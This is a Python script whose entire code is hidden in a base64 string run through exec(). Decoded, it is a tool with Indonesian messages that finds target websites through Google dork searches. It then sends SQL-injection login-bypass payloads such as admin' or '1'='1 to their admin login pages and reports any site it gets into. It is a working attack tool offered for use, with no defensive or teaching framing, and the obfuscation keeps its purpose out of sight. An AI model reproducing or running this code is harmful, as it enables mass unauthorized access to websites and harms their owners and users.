import base64
exec(base64.b64decode('aW1wb3J0IGFyZ3BhcnNlCmltcG9ydCByZXF1ZXN0cwpmcm9tIHRlcm1jb2xvciBpbXBvcnQgY29sb3JlZApmcm9tIGdvb2dsZXNlYXJjaCBpbXBvcnQgc2VhcmNoCmltcG9ydCB0aW1lCgpkZWYgZ29vZ2xlX3NlYXJjaF9kb3JrKHF1ZXJ5LCBudW1fcmVzdWx0cz0xMCwgZGVsYXlfcGVyX3VybD01KToKICAgIHJlc3VsdHMgPSBbXQoKICAgIHRyeToKICAgICAgICBmb3IgaWR4LCByZXN1bHQgaW4gZW51bWVyYXRlKHNlYXJjaChxdWVyeT1xdWVyeSwgbnVtPW51bV9yZXN1bHRzKSwgc3RhcnQ9MSk6ICAKICAgICAgICAgICAgcmVzdWx0cy5hcHBlbmQocmVzdWx0KQogICAgICAgICAgICB0aW1lLnNsZWVwKGRlbGF5X3Blcl91cmwpICAKICAgICAgICAgICAgaWYgaWR4ID49IG51bV9yZXN1bHRzOiAgCiAgICAgICAgICAgICAgICBicmVhawogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3I6IHtlfSIpCgogICAgcmV0dXJuIHJlc3VsdHMKCmRlZiBicnV0ZV9mb3JjZV9hZG1pbl9jcmVkZW50aWFscyh1cmwpOgogICAgcGF5bG9hZHMgPSBbCiAgICAgICAgeyJ1c2VybmFtZSI6ICJhZG1pbicgb3IgJzEnPScxIiwgInBhc3N3b3JkIjogImFkbWluJyBvciAnMSc9JzEifSwKICAgICAgICB7InVzZXJuYW1lIjogImFkbWluJyBvciAnMSc9JzEiLCAicGFzc3dvcmQiOiAicGFzc3dvcmQifSwKICAgICAgICAjIFRhbWJhaGthbiBwYXlsb2FkIGxhaW4gamlrYSBkaXBlcmx1a2FuCiAgICBdCgogICAgZm9yIHBheWxvYWQgaW4gcGF5bG9hZHM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPXBheWxvYWQpCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIHJldHVybiBwYXlsb2FkWyJ1c2VybmFtZSJdLCBwYXlsb2FkWyJwYXNzd29yZCJdCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludChmIkVycm9yOiB7ZX0iKQoKICAgIHJldHVybiBOb25lLCBOb25lCgpkZWYgbWFpbigpOgogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249J0dvb2dsZSBzZWFyY2ggd2l0aCB2YXJpb3VzIGRvcmtzLicpCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctdCcsICctLXRhcmdldCcsIGhlbHA9J1RhcmdldCBzaXRlIChlLmcuLCBleGFtcGxlLmNvbSknKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLXAnLCAnLS1maWxldHlwZScsIGhlbHA9J0ZpbGUgdHlwZSB0byBzZWFyY2ggZm9yIChlLmcuLCBwZGYpJykKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoJy1kJywgJy0tZG9yaycsIGhlbHA9J0N1c3RvbSBkb3JrIHRvIHNlYXJjaCBmb3InKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLWEnLCAnLS1hbGxfZmlsZXMnLCBhY3Rpb249J3N0b3JlX3RydWUnLCBoZWxwPSdTZWFyY2ggZm9yIGFsbCBmaWxlcyBvbiB0aGUgdGFyZ2V0IHNpdGUnKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLWsnLCAnLS1udW1fcmVzdWx0cycsIHR5cGU9aW50LCBkZWZhdWx0PTEwLCBoZWxwPSdOdW1iZXIgb2Ygc2VhcmNoIHJlc3VsdHMgdG8gcmV0cmlldmUnKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLWFkbWluJywgbmFyZ3M9JyonLCBoZWxwPSdBdHRlbXB0IHRvIGZpbmQgYWRtaW4gY3JlZGVudGlhbHMgKG9wdGlvbmFsOiB0YXJnZXQgc2l0ZSknKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLWFkbWluMicsIGFjdGlvbj0nc3RvcmVfdHJ1ZScsIGhlbHA9J0F0dGVtcHQgdG8gZmluZCBhZG1pbiBjcmVkZW50aWFscyB1c2luZyB0YXJnZXQgZnJvbSAtZG9yaycpCgogICAgYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKCiAgICBpZiBhcmdzLmFkbWluMjoKICAgICAgICBpZiBhcmdzLmRvcms6CiAgICAgICAgICAgIHRhcmdldF91cmxzID0gZ29vZ2xlX3NlYXJjaF9kb3JrKGFyZ3MuZG9yaywgbnVtX3Jlc3VsdHM9YXJncy5udW1fcmVzdWx0cykKICAgICAgICAgICAgZm9yIGlkeCwgdXJsIGluIGVudW1lcmF0ZSh0YXJnZXRfdXJscywgc3RhcnQ9MSk6CiAgICAgICAgICAgICAgICB1c2VybmFtZSwgcGFzc3dvcmQgPSBicnV0ZV9mb3JjZV9hZG1pbl9jcmVkZW50aWFscyh1cmwpCiAgICAgICAgICAgICAgICBpZiB1c2VybmFtZSBhbmQgcGFzc3dvcmQ6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoY29sb3JlZChmIlZ1bG4ge2lkeH06IiwgJ2dyZWVuJykpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoY29sb3JlZCgiQWRtaW4gY3JlZGVudGlhbHMgZm91bmQ6IiwgJ2dyZWVuJykpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJVc2VybmFtZToge3VzZXJuYW1lfSIpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJQYXNzd29yZDoge3Bhc3N3b3JkfSIpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJVUkw6IHt1cmx9IikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoY29sb3JlZChmIlZ1bG4ge2lkeH06IiwgJ3JlZCcpKQogICAgICAgICAgICAgICAgICAgIHByaW50KGNvbG9yZWQoIkZhaWxlZCB0byBsb2dpbiB1c2luZyBTUUwgaW5qZWN0aW9uIHBheWxvYWQuIiwgJ3JlZCcpKQogICAgICAgICAgICAgICAgICAgIHByaW50KGNvbG9yZWQoIk1hYWYsIHdlYnNpdGUgaW5pIHRpZGFrIHZ1bG4uIiwgJ3JlZCcpKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBhcnNlci5lcnJvcignRG9yayBtdXN0IGJlIHNwZWNpZmllZCB3aGVuIHVzaW5nIC1hZG1pbjIuJykKCiAgICAgICAgcmV0dXJuCgogICAgaWYgYXJncy5hZG1pbjoKICAgICAgICBpZiBsZW4oYXJncy5hZG1pbikgPT0gMDoKICAgICAgICAgICAgaWYgYXJncy50YXJnZXQ6CiAgICAgICAgICAgICAgICB0YXJnZXRfdXJsID0gZiJodHRwczovL3thcmdzLnRhcmdldH0vYWRtaW4vbG9naW4iCiAgICAgICAgICAgICAgICB1c2VybmFtZSwgcGFzc3dvcmQgPSBicnV0ZV9mb3JjZV9hZG1pbl9jcmVkZW50aWFscyh0YXJnZXRfdXJsKQogICAgICAgICAgICAgICAgaWYgdXNlcm5hbWUgYW5kIHBhc3N3b3JkOgogICAgICAgICAgICAgICAgICAgIHByaW50KGNvbG9yZWQoIkFkbWluIGNyZWRlbnRpYWxzIGZvdW5kOiIsICdncmVlbicpKQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiVXNlcm5hbWU6IHt1c2VybmFtZX0iKQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiUGFzc3dvcmQ6IHtwYXNzd29yZH0iKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChjb2xvcmVkKCJGYWlsZWQgdG8gbG9naW4gdXNpbmcgU1FMIGluamVjdGlvbiBwYXlsb2FkLiIsICdyZWQnKSkKICAgICAgICAgICAgICAgICAgICBwcmludChjb2xvcmVkKCJNYWFmLCB3ZWJzaXRlIGluaSB0aWRhayB2dWxuLiIsICdyZWQnKSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHBhcnNlci5lcnJvcignVGFyZ2V0IHNpdGUgbXVzdCBiZSBzcGVjaWZpZWQgd2hlbiB1c2luZyAtYWRtaW4uJykKICAgICAgICBlbGlmIGxlbihhcmdzLmFkbWluKSA9PSAxOgogICAgICAgICAgICB0YXJnZXRfdXJsID0gZiJodHRwczovL3thcmdzLmFkbWluWzBdfS9hZG1pbi9sb2dpbiIKICAgICAgICAgICAgdXNlcm5hbWUsIHBhc3N3b3JkID0gYnJ1dGVfZm9yY2VfYWRtaW5fY3JlZGVudGlhbHModGFyZ2V0X3VybCkKICAgICAgICAgICAgaWYgdXNlcm5hbWUgYW5kIHBhc3N3b3JkOgogICAgICAgICAgICAgICAgcHJpbnQoY29sb3JlZCgiQWRtaW4gY3JlZGVudGlhbHMgZm91bmQ6IiwgJ2dyZWVuJykpCiAgICAgICAgICAgICAgICBwcmludChmIlVzZXJuYW1lOiB7dXNlcm5hbWV9IikKICAgICAgICAgICAgICAgIHByaW50KGYiUGFzc3dvcmQ6IHtwYXNzd29yZH0iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoY29sb3JlZCgiRmFpbGVkIHRvIGxvZ2luIHVzaW5nIFNRTCBpbmplY3Rpb24gcGF5bG9hZC4iLCAncmVkJykpCiAgICAgICAgICAgICAgICBwcmludChjb2xvcmVkKCJNYWFmLCB3ZWJzaXRlIGluaSB0aWRhayB2dWxuLiIsICdyZWQnKSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXJzZXIuZXJyb3IoJ0ludmFsaWQgdXNhZ2Ugb2YgLWFkbWluLicpCgogICAgICAgIHJldHVybgoKICAgIGlmIG5vdCBhbnkoW2FyZ3MudGFyZ2V0LCBhcmdzLmZpbGV0eXBlLCBhcmdzLmRvcmssIGFyZ3MuYWxsX2ZpbGVzXSk6CiAgICAgICAgcGFyc2VyLmVycm9yKCdBdCBsZWFzdCBvbmUgb2YgLXQsIC1wLCAtZCwgb3IgLWEgc2hvdWxkIGJlIHNwZWNpZmllZC4nKQoKICAgIGlmIGFyZ3MudGFyZ2V0IGFuZCBhcmdzLmFsbF9maWxlczoKICAgICAgICBkb3JrX3F1ZXJ5ID0gZiJzaXRlOnthcmdzLnRhcmdldH0iCiAgICBlbGlmIGFyZ3MuZmlsZXR5cGUgYW5kIGFyZ3MudGFyZ2V0OgogICAgICAgIGRvcmtfcXVlcnkgPSBmImZpbGV0eXBlOnthcmdzLmZpbGV0eXBlfSBzaXRlOnthcmdzLnRhcmdldH0iCiAgICBlbGlmIGFyZ3MuZG9yazoKICAgICAgICBkb3JrX3F1ZXJ5ID0gYXJncy5kb3JrCiAgICBlbHNlOgogICAgICAgIHBhcnNlci5lcnJvcignSW52YWxpZCBjb21iaW5hdGlvbiBvZiBhcmd1bWVudHMuJykKCiAgICAjIEplZGEgd2FrdHUgcGVyIFVSTCB1bnR1ayBtZW5jZWdhaCA0MjkKICAgIGRlbGF5X3Blcl91cmwgPSAxMgoKICAgICMgTWVsYWt1a2FuIHBlbmNhcmlhbiBHb29nbGUgZGVuZ2FuIGRvcmsgeWFuZyBkaXRlbnR1a2FuCiAgICBzZWFyY2hfcmVzdWx0cyA9IGdvb2dsZV9zZWFyY2hfZG9yayhkb3JrX3F1ZXJ5LCBudW1fcmVzdWx0cz1hcmdzLm51bV9yZXN1bHRzLCBkZWxheV9wZXJfdXJsPWRlbGF5X3Blcl91cmwpCgogICAgIyBNZW5hbXBpbGthbiBoYXNpbCBwZW5jYXJpYW4gZGVuZ2FuIHdhcm5hIGhpamF1CiAgICBwcmludChjb2xvcmVkKGYiU2VhcmNoIHJlc3VsdHMgZm9yIGRvcmsgJ3tkb3JrX3F1ZXJ5fSc6IiwgJ2dyZWVuJykpCiAgICBmb3IgaWR4LCByZXN1bHQgaW4gZW51bWVyYXRlKHNlYXJjaF9yZXN1bHRzLCBzdGFydD0xKToKICAgICAgICBwcmludChjb2xvcmVkKGYie2lkeH0uIHtyZXN1bHR9IiwgJ2dyZWVuJykpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigpCg=='))